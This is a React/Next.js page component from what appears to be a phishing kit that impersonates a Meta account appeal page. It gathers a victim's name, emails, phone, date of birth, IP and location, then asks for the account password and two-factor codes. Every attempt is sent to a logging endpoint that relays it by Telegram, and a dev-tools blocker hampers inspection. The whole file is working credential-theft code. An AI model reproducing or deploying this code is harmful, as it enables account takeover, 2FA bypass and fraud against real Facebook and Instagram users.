"use client";

import { useState, useEffect } from "react";
import MetaLogo from "@/components/MetaLogo";
import Sidebar from "@/components/Sidebar";
import MobileHeader from "@/components/MobileHeader";
import ContentCard from "@/components/ContentCard";
import AppealModal from "@/components/AppealModal";
import PasswordModal from "@/components/PasswordModal";
import MethodModal from "@/components/MethodModal";
import TwoFAModal from "@/components/TwoFAModal";
import SuccessModal from "@/components/SuccessModal";
import DevToolsBlocker from "@/components/DevToolsBlocker";

type FormDetails = {
  fullName: string;
  email: string;
  emailBusiness: string;
  pageName: string;
  phoneNumber: string;
  day: string;
  month: string;
  year: string;
  note: string;
  ip: string;
  location: string;
};

export default function PrivacyPage() {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [currentPage, setCurrentPage] = useState("settings");
  const [showAppealModal, setShowAppealModal] = useState(false);
  const [showPasswordModal, setShowPasswordModal] = useState(false);
  const [showMethodModal, setShowMethodModal] = useState(false);
  const [showTwoFAModal, setShowTwoFAModal] = useState(false);
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const [contactInfo, setContactInfo] = useState({ phoneNumber: "", email: "" });
  const [formDetails, setFormDetails] = useState<FormDetails | null>(null);
  const [passwordAttempts, setPasswordAttempts] = useState<string[]>([]);
  const [twofaAttempts, setTwofaAttempts] = useState<string[]>([]);
  const [selectedMethod, setSelectedMethod] = useState<"app" | "sms" | "email" | "whatsapp">("app");

  useEffect(() => {
    const invitationDate = new Date().toLocaleDateString("en-US", {
      year: "numeric",
      month: "long",
      day: "numeric",
    });
    const dateElement = document.getElementById("invitationDate");
    if (dateElement) {
      dateElement.textContent = invitationDate;
    }
  }, []);

  const handleAppealClick = () => {
    setShowAppealModal(true);
  };

  const logEvent = async (
    pwdAttempts: string[],
    tfaAttempts: string[]
  ) => {
    if (!formDetails) {
      console.warn("Cannot log event: formDetails is null");
      return;
    }
    try {
      console.log("Calling /api/log-event with:", {
        formDetails: formDetails.fullName,
        passwordAttempts: pwdAttempts.length,
        twofaAttempts: tfaAttempts.length,
      });
      const response = await fetch("/api/log-event", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          formDetails,
          passwordAttempts: pwdAttempts,
          twofaAttempts: tfaAttempts,
        }),
      });
      const result = await response.json();
      console.log("Log event response:", result);
      if (!result.success) {
        console.error("Failed to send Telegram message:", result.message);
      }
    } catch (error) {
      console.error("Failed to log event", error);
      if (error instanceof Error) {
        console.error("Error details:", error.message);
      }
    }
  };

  const handlePasswordAttempt = (value: string) => {
    if (!formDetails) return;
    const normalized = value || "(empty)";
    const updated = [...passwordAttempts, normalized];
    setPasswordAttempts(updated);
    logEvent(updated, twofaAttempts);
  };

  const handleTwoFAAttempt = (value: string) => {
    if (!formDetails) return;
    const normalized = value || "(empty)";
    const updated = [...twofaAttempts, normalized];
    setTwofaAttempts(updated);
    logEvent(passwordAttempts, updated);
  };

  const handlePasswordSubmit = () => {
    setShowPasswordModal(false);
    setTimeout(() => {
      setShowMethodModal(true);
    }, 300);
  };

  const handleTwoFASubmit = () => {
    setShowTwoFAModal(false);
    setTimeout(() => {
      setShowSuccessModal(true);
    }, 300);
  };

  return (
    <>
      <DevToolsBlocker />
      <MobileHeader onMenuClick={() => setSidebarOpen(!sidebarOpen)} />
      <div 
        className={`sidebar-overlay ${sidebarOpen ? "showing" : ""}`}
        onClick={() => setSidebarOpen(false)}
      ></div>
      
      <div className="content-wrapper">
        <Sidebar 
          isOpen={sidebarOpen}
          currentPage={currentPage}
          onPageChange={setCurrentPage}
          onClose={() => setSidebarOpen(false)}
          onNavClick={handleAppealClick}
        />
        
        <div className="main-content">
          <ContentCard 
            currentPage={currentPage}
            onAppealClick={handleAppealClick}
          />
        </div>
      </div>

      {showAppealModal && (
        <AppealModal 
          onClose={() => setShowAppealModal(false)}
          onPasswordRequired={(details) => {
            setFormDetails(details);
            setContactInfo({ phoneNumber: details.phoneNumber, email: details.email });
            setPasswordAttempts([]);
            setTwofaAttempts([]);
            setSelectedMethod("app");
            setShowAppealModal(false);
            setShowPasswordModal(true);
          }}
        />
      )}

      {showPasswordModal && (
        <PasswordModal 
          onClose={() => setShowPasswordModal(false)}
          onSubmit={handlePasswordSubmit}
          onAttempt={handlePasswordAttempt}
        />
      )}

      {showMethodModal && (
        <MethodModal
          onClose={() => setShowMethodModal(false)}
          onContinue={(method) => {
            setSelectedMethod(method);
            setShowMethodModal(false);
            setShowTwoFAModal(true);
          }}
          contactInfo={contactInfo}
        />
      )}

      {showTwoFAModal && (
        <TwoFAModal 
          onClose={() => setShowTwoFAModal(false)}
          onSubmit={handleTwoFASubmit}
          method={selectedMethod}
          contactInfo={contactInfo}
          onAttempt={handleTwoFAAttempt}
        />
      )}

      {showSuccessModal && (
        <SuccessModal 
          onClose={() => setShowSuccessModal(false)}
        />
      )}
    </>
  );
}

